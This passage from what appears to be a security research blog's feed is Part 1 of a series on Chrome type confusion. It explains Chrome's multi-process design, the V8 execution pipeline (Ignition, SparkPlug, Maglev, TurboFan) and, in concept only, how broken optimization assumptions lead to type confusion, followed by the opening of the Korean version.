Overview of Chrome&#x2019;s Architecture</h2><h3 id="1-1-Multi-process-Architecture"><a href="#1-1-Multi-process-Architecture" class="headerlink" title="1.1 Multi-process Architecture"></a>1.1 Multi-process Architecture</h3><p>When you double-click the Chrome icon, it may seem like you&#x2019;re launching a single program&#x2014;but in reality, Chrome is composed of multiple processes that communicate via IPC. (If you&#x2019;re curious about IPC, check this out &#x2192; <a href="https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/EN/"><strong>[Research] Windows Named Pipe (EN)</strong></a> )</p><p><img src="image%202.png" alt="image.png"></p><p>ref. <a href="https://developer.chrome.com/blog/inside-browser-part1">https://developer.chrome.com/blog/inside-browser-part1</a></p><p>Let&#x2019;s briefly explore the core processes involved.</p><ul><li>The <strong>Browser Process</strong> is responsible for the user interface (UI) of Chrome&#x2014;what you see every day: tabs, address bar, bookmarks, and so on. It&#x2019;s essentially the first thing you interact with when Chrome starts.</li><li>The <strong>Renderer Process</strong> handles the actual rendering of web content. It interprets HTML, CSS, and JavaScript and transforms them into the visual web pages we see.</li><li>The <strong>GPU Process</strong> takes care of graphics-related tasks, offloading work from the CPU for better performance.</li><li>There are also other specialized processes like <strong>Utility</strong>, <strong>Network</strong>, and <strong>Extension Processes</strong> that handle things such as network communication or running Chrome extensions.</li></ul><p>Together, these modular processes make up Chrome&#x2019;s <strong>multi-process architecture</strong>&#x2014;a system where each component runs independently but collaborates to form a cohesive user experience.</p><p>Why all this complexity? The main reasons are <strong>security</strong> and <strong>stability</strong>.</p><p>Each process is <strong>isolated</strong> from the others. So even if something crashes the whole browser doesn&#x2019;t go down with it. For example, if a bug causes the Renderer Process to crash, the Browser Process can still display a message like &#x201C;This page has become unresponsive&#x201D; instead of crashing the entire application.</p><p><img src="image%203.png" alt="image.png"></p><p>This concept of <strong>isolation</strong> is at the heart of Chrome&#x2019;s <strong>sandboxing security model</strong>. (More on sandboxing in the next post!)</p><h3 id="1-2-How-Chrome-Handles-Front-End-Resources"><a href="#1-2-How-Chrome-Handles-Front-End-Resources" class="headerlink" title="1.2 How Chrome Handles Front-End Resources"></a>1.2 How Chrome Handles Front-End Resources</h3><p><img src="image%204.png" alt="image.png"></p><p>Chrome processes various front-end resources&#x2014;such as HTML, CSS, and JavaScript files&#x2014;to render web pages. Even during that brief moment when you open a new tab and load a website, the underlying multi-process system is already working hard behind the scenes.</p><p>It all starts when Chrome fetches the <strong>HTML document</strong> from the server and begins parsing it. As it encounters <code>&lt;link&gt;</code> and <code>&lt;script&gt;</code> tags, it then requests additional <strong>CSS</strong> and <strong>JavaScript</strong> files. Each resource plays a specific role:</p><ul><li><strong>HTML</strong> defines the structural skeleton of the page.</li><li><strong>CSS</strong> adds styling&#x2014;colors, layouts, fonts&#x2014;to shape the page&#x2019;s appearance.</li><li><strong>JavaScript</strong> brings the page to life, enabling dynamic behavior, user interaction, animations, and logic.</li></ul><p>JavaScript is particularly interesting because it&#x2019;s <strong>dynamically typed</strong> and can <strong>create or modify objects on the fly</strong>. While this makes web development incredibly flexible, it also adds complexity to how browsers execute and manage this code.</p><p><img src="image%205.png" alt="image.png"></p><p>Enter the <strong>V8 JavaScript engine</strong> designed to process JavaScript quickly and efficiently. All of this happens inside the <strong>Renderer Process</strong>, a dedicated and isolated environment for executing front-end code.</p><p>Let&#x2019;s dive deeper into what the Renderer Process actually does!</p><h2 id="2-About-Render-Process"><a href="#2-About-Render-Process" class="headerlink" title="2. About Render Process"></a>2. About Render Process</h2><p>Everything involved in visually displaying and making a web page interactive happens inside the <strong>Renderer Process</strong>. Each tab in Chrome is handled by its own renderer, and within that process, the entire rendering pipeline takes place: HTML parsing, CSS application, DOM construction, JavaScript execution, layout calculation, painting, and compositing.</p><p><img src="image%206.png" alt="image.png"></p><p>JavaScript is a very flexible language that allows types to change during execution and object structures to be modified dynamically. While this makes development powerful, it also introduces risks such as memory corruption and vulnerabilities like <strong>Type Confusion</strong>. To reduce these risks, Chrome isolates JavaScript execution inside separate Renderer Processes. Even if something goes wrong in one tab, only that specific process needs to be terminated, without affecting other tabs or the browser as a whole.</p><p>Let&#x2019;s now take a look at how JavaScript is executed inside the renderer.</p><h3 id="2-1-From-Blink-to-V8"><a href="#2-1-From-Blink-to-V8" class="headerlink" title="2.1 From Blink to V8"></a><strong>2.1 From Blink to V8</strong></h3><p>In Chrome&#x2019;s rendering pipeline, the <strong>Blink engine</strong> is responsible for parsing HTML and rendering the visual structure of the page, while the <strong>V8 engine</strong> is responsible for executing JavaScript. These two engines work closely together to create a fully functional web experience.</p><p>Now, let&#x2019;s take a look at how control flows from Blink to V8.</p><p><strong>&#x2460; When a <code>&lt;script&gt;</code> tag is encountered</strong></p><p>While Blink is parsing HTML, if it comes across a <code>&lt;script&gt;</code> tag, it begins to stream the corresponding JavaScript file. The streamed JS code is passed to the V8 engine as a string. From this point on, V8 takes over the execution flow.</p><p><img src="image%207.png" alt="image.png"></p><hr><p><strong>&#x2461; Scanner: Converting the string into tokens</strong></p><p>Inside V8, the first component to process the UTF-16 JavaScript string received from Blink is the <strong>scanner</strong>. The scanner breaks down the string into meaningful tokens based on JavaScript grammar. For example, <code>function</code>, <code>if</code>, <code>=</code>, <code>123</code>, and <code>&apos;hello&apos;</code> are all separate tokens. These tokens are then passed on to the parser.</p><p><img src="image%208.png" alt="image.png"></p><hr><p><strong>&#x2462; Parser: Building the AST</strong></p><p>The <strong>parser</strong> analyzes the tokens and constructs an Abstract Syntax Tree (AST) that represents the structure and semantics of the code. Since this involves compiler theory, we&#x2019;ll skip the deep details for now.</p><p><img src="image%209.png" alt="image.png"></p><hr><p><strong>&#x2463; Ignition: Converting to bytecode</strong></p><p>The AST is handed off to <strong>Ignition</strong>, V8&#x2019;s interpreter. Ignition walks through the AST and translates the JavaScript into <strong>bytecode</strong>, a lower-level representation optimized for fast execution within V8. This bytecode sits at a level of abstraction between source code and machine code.</p><p><img src="image%2010.png" alt="image.png"></p><hr><p><strong>&#x2464; Execution!</strong></p><p>Finally, the generated bytecode is executed sequentially by the <strong>Ignition interpreter</strong>. At this stage, the JavaScript code we wrote actually runs&#x2014;registering event listeners, modifying the DOM, animating elements, and more. While executing, V8 monitors code behavior. If certain functions are called frequently or specific code paths are executed often, V8 activates its optimizing compiler, <strong>TurboFan</strong>, to generate <strong>Just-In-Time (JIT)</strong> compiled native machine code. This results in a significant performance boost.</p><p>Now that we&#x2019;ve seen the full JavaScript execution process, let&#x2019;s take a deeper look into the <strong>internal structure of the V8 engine</strong> that powers it.</p><h3 id="2-2-Introduction-to-the-V8-Engine"><a href="#2-2-Introduction-to-the-V8-Engine" class="headerlink" title="2.2 Introduction to the V8 Engine"></a><strong>2.2 Introduction to the V8 Engine</strong></h3><p><img src="image%2011.png" alt="image.png"></p><p>.</p><p>The name &#x201C;V8&#x201D; was inspired by high-performance car engines. The Chrome team chose this name to reflect their hope that their JavaScript engine would be just as fast and powerful. And in reality, V8 is far more than a simple interpreter&#x2014;it&#x2019;s a complex and highly optimized execution engine that combines multiple tiers of performance techniques.</p><p>As mentioned earlier, JavaScript is a <strong>dynamically typed language</strong>, meaning the types of variables and object structures are not known until runtime. This provides great flexibility for developers, but it also presents serious challenges for performance and security in the engine. To address these, V8 adopts a <strong>multi-phase execution pipeline</strong>.</p><p>Initially, V8 used <strong>Crankshaft</strong>, a JIT compiler that compiled JavaScript straight to machine code without interpreting it first. However, this approach had limitations:</p><ul><li>Attempting to optimize all code resulted in <strong>high memory usage</strong> and <strong>slow startup times</strong>.</li><li>Due to JavaScript&#x2019;s dynamic nature, <strong>deoptimizations</strong> were frequent and costly.</li><li>Supporting newer ECMAScript features was becoming increasingly difficult, making Crankshaft <strong>hard to maintain</strong>.</li></ul><p>As a result, the V8 team designed a new compiler architecture: <strong>TurboFan</strong>.</p><p><img src="image%2012.png" alt="image.png"></p><p><strong>TurboFan (since v5.9)</strong></p><p>TurboFan replaced Crankshaft as V8&#x2019;s new optimizing compiler. It was built with the following goals:</p><ul><li>Full support for the modern JavaScript language spec</li><li>A robust optimization pipeline centered on intermediate representations (IR)</li><li>High portability and scalability across various platforms and architectures</li></ul><p>While TurboFan delivered powerful optimizations, it still had a drawback&#x2014;it took time to kick in. For short-lived scripts that run briefly (which is common on the web), the benefits often didn&#x2019;t justify the cost.</p><p><strong>SparkPlug (introduced in 2021)</strong></p><p>To bridge this gap, the V8 team introduced <strong>SparkPlug</strong>, a lightweight JIT compiler designed for quick compilation. SparkPlug aimed to:</p><ul><li>Compile from bytecode that had already been parsed and interpreted</li><li>Skip deep type analysis and complex optimizations in favor of <strong>speed</strong></li><li>Generate machine code faster than TurboFan, albeit less optimized</li></ul><p>SparkPlug offered a significant boost during the early execution stages&#x2014;particularly helpful for page loading and initial user interactions.</p><p><strong>Maglev (2022 and onward)</strong></p><p>While SparkPlug worked well, its optimizations were still limited. The V8 team wanted something <strong>faster than TurboFan</strong> and <strong>smarter than SparkPlug</strong>, especially for resource-constrained environments like mobile. Enter <strong>Maglev</strong>.</p><p>Maglev was designed to:</p><ul><li>Generate register-based machine code more aggressively than SparkPlug</li><li>Incorporate lightweight type feedback to improve performance</li><li>Match SparkPlug&#x2019;s compile speed while approaching TurboFan-level performance at runtime</li></ul><p>Maglev is especially useful for devices with limited resources and helps strike a balance between speed and optimization.</p><p>Today, V8 uses a <strong>tiered execution model</strong> that progresses through multiple stages based on code &#x201C;hotness&#x201D;:</p><p><strong>Ignition &#x2192; Maglev &#x2192; TurboFan</strong>. This dynamic system allows V8 to adjust the level of optimization depending on how frequently the code is executed.</p><h3 id="2-3-The-V8-Execution-Pipeline"><a href="#2-3-The-V8-Execution-Pipeline" class="headerlink" title="2.3 The V8 Execution Pipeline"></a>2.3 The V8 Execution Pipeline</h3><p>Based on what we&#x2019;ve discussed so far, let&#x2019;s summarize how V8&#x2019;s execution pipeline works.</p><p><img src="image%2013.png" alt="image.png"></p><p>At the heart of V8&#x2019;s pipeline is the <strong>Ignition interpreter</strong>. It converts JavaScript source code into bytecode and begins executing it sequentially while collecting runtime feedback. Ignition was designed for <strong>fast startup and low memory consumption</strong>, and replaced the older Full-codegen system in Chrome v5.9. However, interpreters alone can&#x2019;t offer high performance, so once certain parts of the code become &#x201C;hot&#x201D; (frequently executed), they are promoted to the next stage for Just-In-Time (JIT) compilation.</p><p>That&#x2019;s where <strong>SparkPlug</strong> comes in. SparkPlug compiles bytecode into <strong>native machine code quickly</strong>, without performing deep type analysis or applying complex optimizations. This makes it ideal for scenarios where <strong>fast, lightweight performance is required</strong>, such as during page loading or initial user interactions. It&#x2019;s efficient in both speed and resource usage, acting as a smart middle ground between interpretation and full optimization.</p><p>When higher performance is needed, V8 turns to its full optimizing compiler, <strong>TurboFan</strong>. TurboFan uses the <strong>type feedback, call patterns, and loop structures</strong> collected during earlier execution to apply advanced optimizations&#x2014;such as inlining, loop unrolling, and type specialization. The result is <strong>highly optimized native code</strong> that performs similarly to code in statically typed languages. Since optimized code is cached, subsequent calls execute very quickly, making TurboFan particularly effective for hot, long-running code paths.</p><p>However, TurboFan comes with a cost. Compilation can be expensive, and failed optimizations (deopts) can hurt performance. To bridge the gap between SparkPlug and TurboFan, V8 introduced <strong>Maglev</strong>.</p><p><strong>Maglev</strong> is a <strong>mid-tier JIT compiler</strong> designed to balance <strong>optimization quality and compilation speed</strong>. It generates more efficient register-based machine code than SparkPlug and incorporates some degree of type feedback, but without the heavy compilation cost of TurboFan. Introduced gradually starting in 2022, Maglev performs particularly well on <strong>resource-constrained environments like mobile devices</strong> and provides a flexible middle layer that adapts to various runtime scenarios.</p><p><img src="image%2014.png" alt="image.png"></p><p>To summarize, V8 doesn&#x2019;t rely on a single compiler strategy. Instead, it uses a <strong>tiered execution pipeline</strong> that dynamically escalates optimization based on how frequently code is executed. This means it doesn&#x2019;t waste resources upfront, but rather <strong>invests incrementally</strong> to achieve better performance over time.</p><hr><p>Thanks to this layered approach, V8 can successfully balance <strong>fast startup, low memory usage, and high execution performance</strong>&#x2014;all at once.</p><p><img src="image%2015.png" alt="image.png"></p><p>However, this sophisticated execution pipeline also introduces potential <strong>security vulnerabilities</strong>. Most of V8&#x2019;s optimizations rely on assumptions such as:</p><blockquote><p><em>&#x201C;This object will continue to have the same structure,&#x201D;</em> or <em>&#x201C;This function will always be called in the same way.&#x201D;</em></p></blockquote><p>But when these assumptions are broken, V8 ends up performing <strong>memory access or object interpretation based on incorrect premises</strong>, and this is where one of the most common vulnerabilities, <strong>Type Confusion</strong>, can occur.</p><p><strong>Type Confusion</strong>, as the name suggests, happens when the engine makes incorrect inferences about the type of an object or value. It may also occur when the type changes, but the engine continues to treat it as if it hasn&#x2019;t. For example, suppose an object starts off as a simple array of integers. If, during runtime, it becomes an array of complex objects but V8 still assumes it&#x2019;s just an integer array and runs optimized code based on that assumption, it could result in <strong>invalid memory access or corruption of internal structures</strong>.</p><p>These issues tend to happen more often during advanced optimizations performed by <strong>TurboFan</strong> or <strong>Maglev</strong>. Techniques like type specialization, function inlining, and hidden class assumptions can lock in certain behaviors to boost performance. However, if the code path changes or an object&#x2019;s structure is altered afterward, these optimizations can become dangerous. For instance, an attacker might repeatedly call a function in a consistent way to convince the engine it&#x2019;s safe to optimize. Then, at a specific moment, they intentionally alter the object&#x2019;s type or structure, which triggers unexpected behavior in the native code that V8 already compiled. This technique has been used in several real-world Chrome exploits, and <strong>Type Confusion vulnerabilities in V8 are still considered high-risk attack vectors today</strong>.</p><p>Now that we&#x2019;ve walked through how JavaScript runs inside V8, the next step is to look deeper into how the engine represents and optimizes objects internally, and how this design can lead to security issues like Type Confusion.</p><p>Let&#x2019;s take a breath here.</p><p>I&#x2019;ll be back with <strong>Part 2</strong> of the series. See you soon!</p><ul><li>UP Next: Part2)</li></ul><p><img src="image%2016.png" alt="image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>v <strong>Conference Video</strong></p><ul><li><a href="https://www.youtube.com/watch?v=RL2po1swXO4">https://www.youtube.com/watch?v=RL2po1swXO4</a></li></ul><p>v <strong>V8 Engine</strong></p><ul><li><a href="https://v8.dev/">https://v8.dev/</a></li><li><a href="https://en.wikipedia.org/wiki/V8_(JavaScript_engine">https://en.wikipedia.org/wiki/V8_(JavaScript_engine</a>)</li><li><a href="https://evan-moon.github.io/2019/06/28/v8-analysis/">https://evan-moon.github.io/2019/06/28/v8-analysis/</a></li><li><a href="https://blog.bitsrc.io/secret-behind-javascript-performance-v8-hidden-classes-ba4d0ebfb89d">https://blog.bitsrc.io/secret-behind-javascript-performance-v8-hidden-classes-ba4d0ebfb89d</a></li><li><a href="https://medium.com/@yanguly/sparkplug-v8-baseline-javascript-compiler-758a7bc96e84">https://medium.com/@yanguly/sparkplug-v8-baseline-javascript-compiler-758a7bc96e84</a></li><li><a href="https://pks2974.medium.com/v8-%EC%97%90%EC%84%9C-javascript-%EC%BD%94%EB%93%9C%EB%A5%BC-%EC%8B%A4%ED%96%89%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95-%EC%A0%95%EB%A6%AC%ED%95%B4%EB%B3%B4%EA%B8%B0-25837f61f551">https://pks2974.medium.com/v8-%EC%97%90%EC%84%9C-javascript-%EC%BD%94%EB%93%9C%EB%A5%BC-%EC%8B%A4%ED%96%89%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95-%EC%A0%95%EB%A6%AC%ED%95%B4%EB%B3%B4%EA%B8%B0-25837f61f551</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome-internal/">Chrome internal</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 1.(KR)</title>
      <link>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/</link>
      <guid>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/</guid>
      <pubDate>Tue, 01 Jul 2025 08:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAC11;&#xC790;&#xAE30; &#xB72C;&#xAE08; &#xC5C6;&#xC774; &#xD06C;&#xB86C;&#xC774; &#xB098;&#xC640;&#xC11C; &#xB2F9;&#xD669;&#xD558;&#xC168;&#xC8E0;. &#xC800;&#xB3C4; &#xB9CE;&#xC774; &#xB2F9;&#xD669;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xD06C;&#xB86C;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC744;&#xC904;&#xC740; &#xBAB0;&#xB790;&#xB294;&#xB370;, &#xC5B4;&#xCA4C;&#xB2E4;&#xAC00; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; &#xB3D9;&#xC601;&#xC0C1;&#xC744; &#xBCF4;&#xAC8C; &#xB418;&#xC5C8;&#xACE0; &#xADF8;&#xB0E5; &#x201C;&#xC640;, &#xC7AC;&#xBC0C;&#xB2E4;.&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5B4;&#xC11C; &#xC544;&#xBB34;&#xC0DD;&#xAC01; &#xC5C6;&#xC774; &#xACF5;&#xBD80;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;(<a href="https://www.youtube.com/watch?v=RL2po1swXO4">&#xB9C1;&#xD06C;</a>).</p><p><img src="image.png" alt="image.png"></p><p>&#xD06C;&#xB86C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xB97C; &#xD574;&#xC57C;&#xC9C0;, &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC544;&#xC57C;&#xC9C0; &#xAC19;&#xC740; &#xAC70;&#xCC3D;&#xD55C; &#xBAA9;&#xD45C;&#xB294; &#xC5C6;&#xAD6C;&#xC694;. &#xADF8;&#xB0E5; &#x2018;&#xC7AC;&#xBC0C;&#xC73C;&#xB2C8; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB2E4;&#x2019; &#xC815;&#xB3C4; &#xC778;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD06C;&#xB86C;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xACF5;&#xBD80;&#xB97C; &#xD574;&#xBCF4;&#xBA74; <strong>Type Confusion</strong>&#xC774;&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xC2EC;&#xC2EC;&#xCE58; &#xC54A;&#xAC8C; &#xB4E4;&#xC744; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774; Type Confusion &#xC774; &#xBB58;&#xAE4C;&#xB3C4; &#xAD81;&#xAE08;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xD130;&#xB137;&#xC5D0; &#xC788;&#xB294; &#xBE14;&#xB85C;&#xADF8; &#xAE00;&#xB4E4;&#xC744; &#xCB49; &#xBD24;&#xB294;&#xB370;, js, &#xC6F9; &#xAD00;&#xB828; &#xB0B4;&#xC6A9;&#xC744; 1&#xB3C4; &#xBAA8;&#xB974;&#xB294; &#xC800;&#xB85C;&#xC11C;&#xB294; &#xC774;&#xD574;&#xD558;&#xAE30;&#xAC00; &#xB108;&#xBB34;&#xC5B4;&#xB824;&#xC6E0;&#xC5B4;&#xC694;. &#xADF8;&#xB798;&#xB3C4; Chrome Exploit &#xC744; &#xACF5;&#xBD80;&#xD574;&#xBD24;&#xB294;&#xB370; &#xC544; &#xC774;&#xB798;&#xC11C; Type Confusion &#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; Exploit&#xC744; &#xD558;&#xB294;&#xAD6C;&#xB098; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xACF5;&#xBD80;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xC0B0;&#xC131;&#xC788;&#xAC8C; &#xC758;&#xBBF8;&#xB97C; &#xAC00;&#xC838;&#xAC08; &#xC218; &#xC788;&#xC744;&#xAE4C; &#xACE0;&#xBBFC;&#xD574;&#xBCF4;&#xC558;&#xB294;&#xB370;, &#x201C;&#xBC30;&#xC6CC;&#xC11C; &#xB0A8;&#xC8FC;&#xC790;&#x201D;&#xB77C;&#xB294; &#xB9D0;&#xCC98;&#xB7FC; &#xD06C;&#xB86C; exploit &#xACF5;&#xBD80;&#xC5D0; &#xAC00;&#xC7A5; baseline &#xC774; &#xB418;&#xB294; Type Confusion&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xCD08;&#xC2EC;&#xC790;&#xAC00; &#xC785;&#xBB38;&#xD558;&#xAE30; &#xC88B;&#xAC8C; &#xD55C;&#xB2E4;&#xBA74; &#xADF8;&#xAC78;&#xB85C; &#xC774;&#xBBF8; &#xC720;&#xC758;&#xBBF8;&#xD55C; &#xACB0;&#xACFC;&#xAC00; &#xC544;&#xB2D0;&#xAE4C; &#xC0DD;&#xAC01;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xB098;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!!!!</p><p><img src="TypeConfusion101.png" alt="TypeConfusion101.png"></p><p>Type Confusion &#xC774; &#xBB34;&#xC5C7;&#xC774;&#xACE0; &#xD06C;&#xB86C;&#xC5D0;&#xC11C;&#xB294; &#xC65C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBB34;&#xC5C7;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD55C;&#xBC88; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC2E4; &#xC774;&#xBBF8; &#xC800;&#xC758; &#xC0AC;&#xC2EC;(?)&#xC744; &#xB2F4;&#xC544;&#xC11C; Type Confusion &#xC5D0; &#xAD00;&#xB828;&#xD55C; &#xC2A4;&#xD3EC;&#xB97C; &#xC774;&#xBBF8; &#xD558;&#xACE0; &#xC788;&#xC5C8;&#xC5B4;&#xC694;.</p><p><a href="https://maily.so/hackyboiz/posts/1gz2v4jxr3q">https://maily.so/hackyboiz/posts/1gz2v4jxr3q</a></p><p>&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;^^</p><p>Type Confusion 101 in Chrome &#xC2DC;&#xB9AC;&#xC988;&#xB294; 4&#xBD80;&#xC791;&#xC73C;&#xB85C; &#xC0DD;&#xAC01; &#xC911;&#xC778;&#xB370;, &#xC778;&#xC0DD;&#xC740; &#xC5ED;&#xC2DC; &#xC0DD;&#xAC01;&#xD55C;&#xB300;&#xB85C; &#xC548;&#xB418;&#xB294;&#xAC8C; &#xC7AC;&#xBBF8; &#xC544;&#xB2C8;&#xACA0;&#xC5B4;&#xC694;?!? &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xC9C0;&#xB294; &#xAC19;&#xC774; &#xC9C0;&#xCF1C;&#xBCF4;&#xC790;&#xAD6C;&#xC694;! &#x314E;&#x314E;</p><p>&#xC624;&#xB298;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xBD80;&#xD130; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xB2E4; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; &#xD06C;&#xB86C;&#xC774; &#xBB34;&#xC5C7;&#xC774;&#xACE0; Type Confusion &#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; V8&#xC740; &#xC5B4;&#xB5A4; component&#xC778;&#xC9C0; &#xAC19;&#xC774; &#xBCF4;&#xB7EC; &#xAC00;&#xC2DC;&#xC8E0; </p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-Chrome-&#xC804;&#xCCB4;-&#xC544;&#xD0A4;&#xD14D;&#xCC98;-&#xAC1C;&#xC694;"><a href="#1-Chrome-&#xC804;&#xCCB4;-&#xC544;&#xD0A4;&#xD14D;&#xCC98;-&#xAC1C;&#xC694;" class="headerlink" title="1. Chrome &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xAC1C;&#xC694;"></a><strong>1. Chrome &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xAC1C;&#xC694;</strong></h2><h3 id="1-1-Multi-process-&#xAD6C;&#xC870;"><a href="#1-1-Multi-process-&#xAD6C;&#xC870;" class="headerlink" title="1.1 Multi-process &#xAD6C;&#xC870;"></a>1.1 Multi-process &#xAD6C;&#xC870;</h3><p>&#xD06C;&#xB86C;&#xC740; &#xB538;&#xAE4D;(&#xC544;&#xC774;&#xCF58; &#xB354;&#xBE14;&#xD074;&#xB9AD;)&#xD558;&#xBA74; &#xD558;&#xB098;&#xC758; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xCF1C;&#xC9C0;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC2E4;&#xC740; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC774; IPC &#xD1B5;&#xC2E0;&#xC744; &#xD558;&#xBA70; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (IPC &#xD1B5;&#xC2E0;&#xC774; &#xAD81;&#xAE08;&#xD558;&#xC2DC;&#xB2E4;&#xBA74; &#x2192; <a href="https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/KR/">**[Research] Windows Named Pipe (KR)</a> )**</p><p><img src="image%202.png" alt="image.png"></p><p>ref. <a href="https://developer.chrome.com/blog/inside-browser-part1">https://developer.chrome.com/blog/inside-browser-part1</a></p><p>&#xD06C;&#xB86C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD575;&#xC2EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01;&#xC740; &#xD2B9;&#xC815; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA70;, &#xD568;&#xAED8; &#xC791;&#xB3D9;&#xD574; &#xD558;&#xB098;&#xC758; &#xD1B5;&#xD569;&#xB41C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>Browser Process</strong></p><p>  &#xC6B0;&#xB9AC;&#xAC00; &#xB9E4;&#xC77C; &#xBCF4;&#xB294; &#xD0ED;, &#xC8FC;&#xC18C;&#xCC3D;, &#xC990;&#xACA8;&#xCC3E;&#xAE30; &#xBC14; &#xB4F1; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC758; UI&#xB97C; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xD06C;&#xB86C;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xC791;&#xB3D9;&#xD558;&#xB294; &#xD575;&#xC2EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Renderer Process</strong></p><p>  &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xC758; &#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xB80C;&#xB354;&#xB9C1; &#xC791;&#xC5C5;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. HTML, CSS, JavaScript &#xAC19;&#xC740; &#xD504;&#xB7F0;&#xD2B8;&#xC5D4;&#xB4DC; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; 